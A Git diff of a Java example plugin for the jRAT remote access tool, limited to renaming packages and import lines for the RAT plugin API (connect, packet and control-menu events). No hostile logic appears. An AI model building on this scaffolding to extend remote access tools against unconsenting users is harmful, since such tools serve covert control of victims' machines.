@@ -1,4 +1,5 @@
-package pro.jrat.client;
+package jrat.plugin.example.client;
+
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
@@ -8,19 +9,19 @@ import java.util.List;
 
 import javax.swing.ImageIcon;
 
-import pro.jrat.api.RATControlMenuEntry;
-import pro.jrat.api.RATMenuItem;
-import pro.jrat.api.RATMenuItemActionListener;
-import pro.jrat.api.RATObject;
-import pro.jrat.api.RATPlugin;
-import pro.jrat.api.events.OnConnectEvent;
-import pro.jrat.api.events.OnDisableEvent;
-import pro.jrat.api.events.OnDisconnectEvent;
-import pro.jrat.api.events.OnEnableEvent;
-import pro.jrat.api.events.OnPacketEvent;
-import pro.jrat.api.events.OnSendPacketEvent;
-import pro.jrat.client.ui.DialogAbout;
-import pro.jrat.client.ui.ExampleControlPanel;
+import jrat.api.RATControlMenuEntry;
+import jrat.api.RATMenuItem;
+import jrat.api.RATMenuItemActionListener;
+import jrat.api.RATObject;
+import jrat.api.RATPlugin;
+import jrat.api.events.OnConnectEvent;
+import jrat.api.events.OnDisableEvent;
+import jrat.api.events.OnDisconnectEvent;
+import jrat.api.events.OnEnableEvent;
+import jrat.api.events.OnPacketEvent;
+import jrat.api.events.OnSendPacketEvent;
+import jrat.plugin.example.client.ui.DialogAbout;
+import jrat.plugin.example.client.ui.ExampleControlPanel;
 
 public class ExampleClientPlugin extends RATPlugin {
 	
